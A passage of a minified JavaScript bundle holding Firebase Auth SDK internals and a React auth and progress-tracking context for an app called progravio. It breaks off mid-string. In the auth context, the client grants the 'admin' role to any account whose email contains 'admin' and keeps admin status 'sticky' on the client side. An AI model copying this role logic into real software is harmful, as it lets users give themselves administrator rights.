e=or(a);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}async function RB(a,e,t){if(wn(a.app))return Promise.reject(Vo(a));const n=or(a),l=await h0(n,{returnSecureToken:!0,email:e,password:t,clientType:"CLIENT_TYPE_WEB"},"signUpPassword",xB).catch(d=>{throw d.code==="auth/password-does-not-meet-requirements"&&Cj(a),d}),u=await cl._fromIdTokenResponse(n,"signIn",l);return await n._updateCurrentUser(u.user),u}function IB(a,e,t){return wn(a.app)?Promise.reject(Vo(a)):LB(bn(a),Qc.credential(e,t)).catch(async n=>{throw n.code==="auth/password-does-not-meet-requirements"&&Cj(a),n})}function wB(a,e,t,n){return bn(a).onIdTokenChanged(e,t,n)}function jB(a,e,t){return bn(a).beforeAuthStateChanged(e,t)}function DB(a,e,t,n){return bn(a).onAuthStateChanged(e,t,n)}function MB(a){return bn(a).signOut()}const Ph="__sak";class Tj{constructor(e,t){this.storageRetriever=e,this.type=t}_isAvailable(){try{return this.storage?(this.storage.setItem(Ph,"1"),this.storage.removeItem(Ph),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,t){return this.storage.setItem(e,JSON.stringify(t)),Promise.resolve()}_get(e){const t=this.storage.getItem(e);return Promise.resolve(t?JSON.parse(t):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}const NB=1e3,_B=10;class xj extends Tj{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,t)=>this.onStorageEvent(e,t),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=hj(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const t of Object.keys(this.listeners)){const n=this.storage.getItem(t),i=this.localCache[t];n!==i&&e(t,i,n)}}onStorageEvent(e,t=!1){if(!e.key){this.forAllChangedKeys((l,u,d)=>{this.notifyListeners(l,d)});return}const n=e.key;t?this.detachListener():this.stopPolling();const i=()=>{const l=this.storage.getItem(n);!t&&this.localCache[n]===l||this.notifyListeners(n,l)},r=this.storage.getItem(n);Xz()&&r!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,_B):i()}notifyListeners(e,t){this.localCache[e]=t;const n=this.listeners[e];if(n)for(const i of Array.from(n))i(t&&JSON.parse(t))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,t,n)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:t,newValue:n}),!0)})},NB)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,t){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,t){await super._set(e,t),this.localCache[e]=JSON.stringify(t)}async _get(e){const t=await super._get(e);return this.localCache[e]=JSON.stringify(t),t}async _remove(e){await super._remove(e),delete this.localCache[e]}}xj.type="LOCAL";const qB=xj;class Aj extends Tj{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,t){}_removeListener(e,t){}}Aj.type="SESSION";const Pj=Aj;function kB(a){return Promise.all(a.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(t){return{fulfilled:!1,reason:t}}}))}class lg{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const t=this.receivers.find(i=>i.isListeningto(e));if(t)return t;const n=new lg(e);return this.receivers.push(n),n}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const t=e,{eventId:n,eventType:i,data:r}=t.data,l=this.handlersMap[i];if(!l?.size)return;t.ports[0].postMessage({status:"ack",eventId:n,eventType:i});const u=Array.from(l).map(async p=>p(t.origin,r)),d=await kB(u);t.ports[0].postMessage({status:"done",eventId:n,eventType:i,response:d})}_subscribe(e,t){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(t)}_unsubscribe(e,t){this.handlersMap[e]&&t&&this.handlersMap[e].delete(t),(!t||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}lg.receivers=[];function ZE(a="",e=10){let t="";for(let n=0;n<e;n++)t+=Math.floor(Math.random()*10);return a+t}class OB{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,t,n=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let r,l;return new Promise((u,d)=>{const p=ZE("",20);i.port1.start();const f=setTimeout(()=>{d(new Error("unsupported_event"))},n);l={messageChannel:i,onMessage(h){const E=h;if(E.data.eventId===p)switch(E.data.status){case"ack":clearTimeout(f),r=setTimeout(()=>{d(new Error("timeout"))},3e3);break;case"done":clearTimeout(r),u(E.data.response);break;default:clearTimeout(f),clearTimeout(r),d(new Error("invalid_response"));break}}},this.handlers.add(l),i.port1.addEventListener("message",l.onMessage),this.target.postMessage({eventType:e,eventId:p,data:t},[i.port2])}).finally(()=>{l&&this.removeMessageHandler(l)})}}function so(){return window}function UB(a){so().location.href=a}function Lj(){return typeof so().WorkerGlobalScope<"u"&&typeof so().importScripts=="function"}async function zB(){if(!navigator?.serviceWorker)return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function BB(){return navigator?.serviceWorker?.controller||null}function FB(){return Lj()?self:null}const Rj="firebaseLocalStorageDb",VB=1,Lh="firebaseLocalStorage",Ij="fbase_key";class Lp{constructor(e){this.request=e}toPromise(){return new Promise((e,t)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{t(this.request.error)})})}}function cg(a,e){return a.transaction([Lh],e?"readwrite":"readonly").objectStore(Lh)}function HB(){const a=indexedDB.deleteDatabase(Rj);return new Lp(a).toPromise()}function g0(){const a=indexedDB.open(Rj,VB);return new Promise((e,t)=>{a.addEventListener("error",()=>{t(a.error)}),a.addEventListener("upgradeneeded",()=>{const n=a.result;try{n.createObjectStore(Lh,{keyPath:Ij})}catch(i){t(i)}}),a.addEventListener("success",async()=>{const n=a.result;n.objectStoreNames.contains(Lh)?e(n):(n.close(),await HB(),e(await g0()))})})}async function J2(a,e,t){const n=cg(a,!0).put({[Ij]:e,value:t});return new Lp(n).toPromise()}async function GB(a,e){const t=cg(a,!1).get(e),n=await new Lp(t).toPromise();return n===void 0?null:n.value}function W2(a,e){const t=cg(a,!0).delete(e);return new Lp(t).toPromise()}const QB=800,JB=3;class wj{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await g0(),this.db)}async _withRetries(e){let t=0;for(;;)try{const n=await this._openDb();return await e(n)}catch(n){if(t++>JB)throw n;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return Lj()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=lg._getInstance(FB()),this.receiver._subscribe("keyChanged",async(e,t)=>({keyProcessed:(await this._poll()).includes(t.key)})),this.receiver._subscribe("ping",async(e,t)=>["keyChanged"])}async initializeSender(){if(this.activeServiceWorker=await zB(),!this.activeServiceWorker)return;this.sender=new OB(this.activeServiceWorker);const e=await this.sender._send("ping",{},800);e&&e[0]?.fulfilled&&e[0]?.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||BB()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await g0();return await J2(e,Ph,"1"),await W2(e,Ph),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,t){return this._withPendingWrite(async()=>(await this._withRetries(n=>J2(n,e,t)),this.localCache[e]=t,this.notifyServiceWorker(e)))}async _get(e){const t=await this._withRetries(n=>GB(n,e));return this.localCache[e]=t,t}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(t=>W2(t,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const r=cg(i,!1).getAll();return new Lp(r).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const t=[],n=new Set;if(e.length!==0)for(const{fbase_key:i,value:r}of e)n.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(r)&&(this.notifyListeners(i,r),t.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!n.has(i)&&(this.notifyListeners(i,null),t.push(i));return t}notifyListeners(e,t){this.localCache[e]=t;const n=this.listeners[e];if(n)for(const i of Array.from(n))i(t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),QB)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,t){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}wj.type="LOCAL";const WB=wj;new xp(3e4,6e4);function jj(a,e){return e?Bo(e):(He(a._popupRedirectResolver,a,"argument-error"),a._popupRedirectResolver)}class e1 extends YE{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return Pc(e,this._buildIdpRequest())}_linkToIdToken(e,t){return Pc(e,this._buildIdpRequest(t))}_getReauthenticationResolver(e){return Pc(e,this._buildIdpRequest())}_buildIdpRequest(e){const t={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(t.idToken=e),t}}function KB(a){return Sj(a.auth,new e1(a),a.bypassAuthState)}function YB(a){const{auth:e,user:t}=a;return He(t,e,"internal-error"),PB(t,new e1(a),a.bypassAuthState)}async function $B(a){const{auth:e,user:t}=a;return He(t,e,"internal-error"),AB(t,new e1(a),a.bypassAuthState)}class Dj{constructor(e,t,n,i,r=!1){this.auth=e,this.resolver=n,this.user=i,this.bypassAuthState=r,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(t)?t:[t]}execute(){return new Promise(async(e,t)=>{this.pendingPromise={resolve:e,reject:t};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(n){this.reject(n)}})}async onAuthEvent(e){const{urlResponse:t,sessionId:n,postBody:i,tenantId:r,error:l,type:u}=e;if(l){this.reject(l);return}const d={auth:this.auth,requestUri:t,sessionId:n,tenantId:r||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(u)(d))}catch(p){this.reject(p)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return KB;case"linkViaPopup":case"linkViaRedirect":return $B;case"reauthViaPopup":case"reauthViaRedirect":return YB;default:Zn(this.auth,"internal-error")}}resolve(e){Ko(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){Ko(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}const XB=new xp(2e3,1e4);async function Kv(a,e,t){if(wn(a.app))return Promise.reject(Si(a,"operation-not-supported-in-this-environment"));const n=or(a);Dz(a,e,XE);const i=jj(n,t);return new Wr(n,"signInViaPopup",e,i).executeNotNull()}class Wr extends Dj{constructor(e,t,n,i,r){super(e,t,i,r),this.provider=n,this.authWindow=null,this.pollId=null,Wr.currentPopupAction&&Wr.currentPopupAction.cancel(),Wr.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return He(e,this.auth,"internal-error"),e}async onExecution(){Ko(this.filter.length===1,"Popup operations only handle one event");const e=ZE();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(t=>{this.reject(t)}),this.resolver._isIframeWebStorageSupported(this.auth,t=>{t||this.reject(Si(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){return this.authWindow?.associatedEvent||null}cancel(){this.reject(Si(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,Wr.currentPopupAction=null}pollUserCancellation(){const e=()=>{if(this.authWindow?.window?.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(Si(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,XB.get())};e()}}Wr.currentPopupAction=null;const ZB="pendingRedirect",Vf=new Map;class e8 extends Dj{constructor(e,t,n=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],t,void 0,n),this.eventId=null}async execute(){let e=Vf.get(this.auth._key());if(!e){try{const n=await a8(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(n)}catch(t){e=()=>Promise.reject(t)}Vf.set(this.auth._key(),e)}return this.bypassAuthState||Vf.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const t=await this.auth._redirectUserForId(e.eventId);if(t)return this.user=t,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function a8(a,e){const t=i8(e),n=n8(a);if(!await n._isAvailable())return!1;const i=await n._get(t)==="true";return await n._remove(t),i}function t8(a,e){Vf.set(a._key(),e)}function n8(a){return Bo(a._redirectPersistence)}function i8(a){return Ff(ZB,a.config.apiKey,a.name)}async function o8(a,e,t=!1){if(wn(a.app))return Promise.reject(Vo(a));const n=or(a),i=jj(n,e),l=await new e8(n,i,t).execute();return l&&!t&&(delete l.user._redirectEventId,await n._persistUserIfCurrent(l.user),await n._setRedirectUser(null,e)),l}const s8=600*1e3;class r8{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let t=!1;return this.consumers.forEach(n=>{this.isEventForConsumer(e,n)&&(t=!0,this.sendToConsumer(e,n),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!l8(e)||(this.hasHandledPotentialRedirect=!0,t||(this.queuedRedirectEvent=e,t=!0)),t}sendToConsumer(e,t){if(e.error&&!Mj(e)){const n=e.error.code?.split("auth/")[1]||"internal-error";t.onError(Si(this.auth,n))}else t.onAuthEvent(e)}isEventForConsumer(e,t){const n=t.eventId===null||!!e.eventId&&e.eventId===t.eventId;return t.filter.includes(e.type)&&n}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=s8&&this.cachedEventUids.clear(),this.cachedEventUids.has(K2(e))}saveEventToCache(e){this.cachedEventUids.add(K2(e)),this.lastProcessedEventTime=Date.now()}}function K2(a){return[a.type,a.eventId,a.sessionId,a.tenantId].filter(e=>e).join("-")}function Mj({type:a,error:e}){return a==="unknown"&&e?.code==="auth/no-auth-event"}function l8(a){switch(a.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return Mj(a);default:return!1}}async function c8(a,e={}){return ir(a,"GET","/v1/projects",e)}const u8=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,d8=/^https?/;async function p8(a){if(a.config.emulator)return;const{authorizedDomains:e}=await c8(a);for(const t of e)try{if(m8(t))return}catch{}Zn(a,"unauthorized-domain")}function m8(a){const e=m0(),{protocol:t,hostname:n}=new URL(e);if(a.startsWith("chrome-extension://")){const l=new URL(a);return l.hostname===""&&n===""?t==="chrome-extension:"&&a.replace("chrome-extension://","")===e.replace("chrome-extension://",""):t==="chrome-extension:"&&l.hostname===n}if(!d8.test(t))return!1;if(u8.test(a))return n===a;const i=a.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(n)}const f8=new xp(3e4,6e4);function Y2(){const a=so().___jsl;if(a?.H){for(const e of Object.keys(a.H))if(a.H[e].r=a.H[e].r||[],a.H[e].L=a.H[e].L||[],a.H[e].r=[...a.H[e].L],a.CP)for(let t=0;t<a.CP.length;t++)a.CP[t]=null}}function h8(a){return new Promise((e,t)=>{function n(){Y2(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{Y2(),t(Si(a,"network-request-failed"))},timeout:f8.get()})}if(so().gapi?.iframes?.Iframe)e(gapi.iframes.getContext());else if(so().gapi?.load)n();else{const i=rB("iframefcb");return so()[i]=()=>{gapi.load?n():t(Si(a,"network-request-failed"))},bj(`${sB()}?onload=${i}`).catch(r=>t(r))}}).catch(e=>{throw Hf=null,e})}let Hf=null;function g8(a){return Hf=Hf||h8(a),Hf}const b8=new xp(5e3,15e3),v8="__/auth/iframe",y8="emulator/auth/iframe",E8={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},S8=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function C8(a){const e=a.config;He(e.authDomain,a,"auth-domain-config-required");const t=e.emulator?JE(e,y8):`https://${a.config.authDomain}/${v8}`,n={apiKey:e.apiKey,appName:a.name,v:Bc},i=S8.get(a.config.apiHost);i&&(n.eid=i);const r=a._getFrameworks();return r.length&&(n.fw=r.join(",")),`${t}?${vp(n).slice(1)}`}async function T8(a){const e=await g8(a),t=so().gapi;return He(t,a,"internal-error"),e.open({where:document.body,url:C8(a),messageHandlersFilter:t.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:E8,dontclear:!0},n=>new Promise(async(i,r)=>{await n.restyle({setHideOnLeave:!1});const l=Si(a,"network-request-failed"),u=so().setTimeout(()=>{r(l)},b8.get());function d(){so().clearTimeout(u),i(n)}n.ping(d).then(d,()=>{r(l)})}))}const x8={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},A8=500,P8=600,L8="_blank",R8="http://localhost";class $2{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function I8(a,e,t,n=A8,i=P8){const r=Math.max((window.screen.availHeight-i)/2,0).toString(),l=Math.max((window.screen.availWidth-n)/2,0).toString();let u="";const d={...x8,width:n.toString(),height:i.toString(),top:r,left:l},p=Qt().toLowerCase();t&&(u=uj(p)?L8:t),lj(p)&&(e=e||R8,d.scrollbars="yes");const f=Object.entries(d).reduce((E,[C,A])=>`${E}${C}=${A},`,"");if($z(p)&&u!=="_self")return w8(e||"",u),new $2(null);const h=window.open(e||"",u,f);He(h,a,"popup-blocked");try{h.focus()}catch{}return new $2(h)}function w8(a,e){const t=document.createElement("a");t.href=a,t.target=e;const n=document.createEvent("MouseEvent");n.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),t.dispatchEvent(n)}const j8="__/auth/handler",D8="emulator/auth/handler",M8=encodeURIComponent("fac");async function X2(a,e,t,n,i,r){He(a.config.authDomain,a,"auth-domain-config-required"),He(a.config.apiKey,a,"invalid-api-key");const l={apiKey:a.config.apiKey,appName:a.name,authType:t,redirectUrl:n,v:Bc,eventId:i};if(e instanceof XE){e.setDefaultLanguage(a.languageCode),l.providerId=e.providerId||"",WO(e.getCustomParameters())||(l.customParameters=JSON.stringify(e.getCustomParameters()));for(const[f,h]of Object.entries({}))l[f]=h}if(e instanceof Pp){const f=e.getScopes().filter(h=>h!=="");f.length>0&&(l.scopes=f.join(","))}a.tenantId&&(l.tid=a.tenantId);const u=l;for(const f of Object.keys(u))u[f]===void 0&&delete u[f];const d=await a._getAppCheckToken(),p=d?`#${M8}=${encodeURIComponent(d)}`:"";return`${N8(a)}?${vp(u).slice(1)}${p}`}function N8({config:a}){return a.emulator?JE(a,D8):`https://${a.authDomain}/${j8}`}const Yv="webStorageSupport";class _8{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=Pj,this._completeRedirectFn=o8,this._overrideRedirectResult=t8}async _openPopup(e,t,n,i){Ko(this.eventManagers[e._key()]?.manager,"_initialize() not called before _openPopup()");const r=await X2(e,t,n,m0(),i);return I8(e,r,ZE())}async _openRedirect(e,t,n,i){await this._originValidation(e);const r=await X2(e,t,n,m0(),i);return UB(r),new Promise(()=>{})}_initialize(e){const t=e._key();if(this.eventManagers[t]){const{manager:i,promise:r}=this.eventManagers[t];return i?Promise.resolve(i):(Ko(r,"If manager is not set, promise should be"),r)}const n=this.initAndGetManager(e);return this.eventManagers[t]={promise:n},n.catch(()=>{delete this.eventManagers[t]}),n}async initAndGetManager(e){const t=await T8(e),n=new r8(e);return t.register("authEvent",i=>(He(i?.authEvent,e,"invalid-auth-event"),{status:n.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:n},this.iframes[e._key()]=t,n}_isIframeWebStorageSupported(e,t){this.iframes[e._key()].send(Yv,{type:Yv},i=>{const r=i?.[0]?.[Yv];r!==void 0&&t(!!r),Zn(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const t=e._key();return this.originValidationPromises[t]||(this.originValidationPromises[t]=p8(e)),this.originValidationPromises[t]}get _shouldInitProactively(){return hj()||cj()||KE()}}const q8=_8;var Z2="@firebase/auth",eP="1.12.0";class k8{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){return this.assertAuthConfigured(),this.auth.currentUser?.uid||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const t=this.auth.onIdTokenChanged(n=>{e(n?.stsTokenManager.accessToken||null)});this.internalListeners.set(e,t),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const t=this.internalListeners.get(e);t&&(this.internalListeners.delete(e),t(),this.updateProactiveRefresh())}assertAuthConfigured(){He(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}function O8(a){switch(a){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function U8(a){Ic(new il("auth",(e,{options:t})=>{const n=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),r=e.getProvider("app-check-internal"),{apiKey:l,authDomain:u}=n.options;He(l&&!l.includes(":"),"invalid-api-key",{appName:n.name});const d={apiKey:l,authDomain:u,clientPlatform:a,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:gj(a)},p=new nB(n,i,r,d);return mB(p,t),p},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,t,n)=>{e.getProvider("auth-internal").initialize()})),Ic(new il("auth-internal",e=>{const t=or(e.getProvider("auth").getImmediate());return(n=>new k8(n))(t)},"PRIVATE").setInstantiationMode("EXPLICIT")),Qs(Z2,eP,O8(a)),Qs(Z2,eP,"esm2020")}const z8=300,B8=mI("authIdTokenMaxAge")||z8;let aP=null;const F8=a=>async e=>{const t=e&&await e.getIdTokenResult(),n=t&&(new Date().getTime()-Date.parse(t.issuedAtTime))/1e3;if(n&&n>B8)return;const i=t?.token;aP!==i&&(aP=i,await fetch(a,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function V8(a=yI()){const e=hE(a,"auth");if(e.isInitialized())return e.getImmediate();const t=pB(a,{popupRedirectResolver:q8,persistence:[WB,qB,Pj]}),n=mI("authTokenSyncURL");if(n&&typeof isSecureContext=="boolean"&&isSecureContext){const r=new URL(n,location.origin);if(location.origin===r.origin){const l=F8(r.toString());jB(t,l,()=>l(t.currentUser)),wB(t,u=>l(u))}}const i=dI("auth");return i&&fB(t,`http://${i}`),t}function H8(){return document.getElementsByTagName("head")?.[0]??document}iB({loadJS(a){return new Promise((e,t)=>{const n=document.createElement("script");n.setAttribute("src",a),n.onload=e,n.onerror=i=>{const r=Si("internal-error");r.customData=i,t(r)},n.type="text/javascript",n.charset="UTF-8",H8().appendChild(n)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});U8("Browser");const G8={apiKey:"AIzaSyA6SMzxjXsoc29q6hpZBYn6GbXvAtIZ3Iw",authDomain:"progravio.firebaseapp.com",projectId:"progravio",storageBucket:"progravio.firebasestorage.app",messagingSenderId:"335869815234",appId:"1:335869815234:web:dd6cff208b0a8e5fecce5b",measurementId:"G-26LL944T3Z"},Nj=vI(G8),zr=V8(Nj),Rh=dz(Nj),a1=Go.createContext(void 0),Q8=({children:a})=>{const[e,t]=U.useState(null),[n,i]=U.useState(null),[r,l]=U.useState(!0);U.useEffect(()=>{let C=null;const A=DB(zr,j=>{if(t(j),C&&(C(),C=null),j)try{const R=Eh(Rh,"users",j.uid);C=Zw(R,async I=>{if(I.exists()){const w=I.data().role||"user";i(k=>k==="admin"&&w==="user"?(console.log("AuthContext: Preventing downgrade from admin to user (Sticky Role)"),"admin"):w)}else{console.log("AuthContext: User doc missing, creating default...");const w=j.email?.includes("admin")?"admin":"user";try{await zf(R,{email:j.email,role:w,createdAt:new Date().toISOString()}),i(w)}catch(k){console.error("AuthContext: Failed to create user doc:",k),i("user")}}}),j.getIdToken().then(I=>{console.log("AuthContext: Fetching verified role from backend..."),fetch("https://progravio.onrender.com/users/me",{headers:{Authorization:`Bearer ${I}`}}).then(w=>{if(!w.ok)throw new Error(`HTTP error! status: ${w.status}`);return w.json()}).then(w=>{w.role&&(console.log("AuthContext: Backend verified role:",w.role),i(w.role))}).catch(w=>console.error("AuthContext: Backend verification failed:",w)).finally(()=>l(!1))})}catch(R){console.error("AuthContext: Error setting up listeners:",R),l(!1)}else i(null),l(!1)});return()=>{A(),C&&C()}},[]);const u=async(C,A)=>{await IB(zr,C,A)},d=async(C,A)=>{await RB(zr,C,A)},p=async()=>{await MB(zr)},f=async()=>{const C=new ko;await Kv(zr,C)},h=async()=>{const C=new qo;await Kv(zr,C)},E=async()=>{const C=new Oo;await Kv(zr,C)};return b.jsx(a1.Provider,{value:{user:e,role:n,isAdmin:n==="admin",loading:r,login:u,register:d,logout:p,loginWithGoogle:f,loginWithFacebook:h,loginWithGithub:E},children:!r&&a})},sr=()=>{const a=U.useContext(a1);if(!a)throw new Error("useAuth must be used within an AuthProvider");return a},_j=U.createContext(void 0),tP="progavio_progress_v3",$v={completed:{},checklist:{},favorites:{},lastLessons:{},history:[],xp:0,awardedBonuses:[],favoriteLibraries:[]},J8=({children:a})=>{const{user:e}=sr(),[t,n]=U.useState(()=>{const k=localStorage.getItem(tP);if(!k)return $v;try{const Y=JSON.parse(k);return{...$v,...Y}}catch(Y){return console.error("Error parsing progress from localStorage",Y),$v}}),[i,r]=U.useState(!1);U.useEffect(()=>{(async()=>{if(e){r(!0);try{const Y=Eh(Rh,"users",e.uid),ee=await Pz(Y);if(ee.exists()){const Q=ee.data(),q={completed:{...t.completed,...Q.completed},checklist:{...t.checklist,...Q.checklist},favorites:{...t.favorites,...Q.favorites},lastLessons:{...t.lastLessons,...Q.lastLessons||{}},history:Q.history||t.history,xp:Math.max(t.xp,Q.xp||0),awardedBonuses:Array.from(new Set([...t.awardedBonuses,...Q.awardedBonuses||[]])),favoriteLibraries:Array.from(new Set([...t.favoriteLibraries,...Q.favoriteLibraries||[]]))};n(q),await zf(Y,q)}else(Object.keys(t.completed).length>0||t.xp>0)&&await zf(Y,t,{merge:!0})}catch(Y){console.error("Error syncing with Firestore:",Y)}finally{r(!1)}}})()},[e?.uid]),U.useEffect(()=>{localStorage.setItem(tP,JSON.stringify(t));const Y=setTimeout(async()=>{if(e&&!i)try{await zf(Eh(Rh,"users",e.uid),t,{merge:!0})}catch(ee){console.error("Error saving to 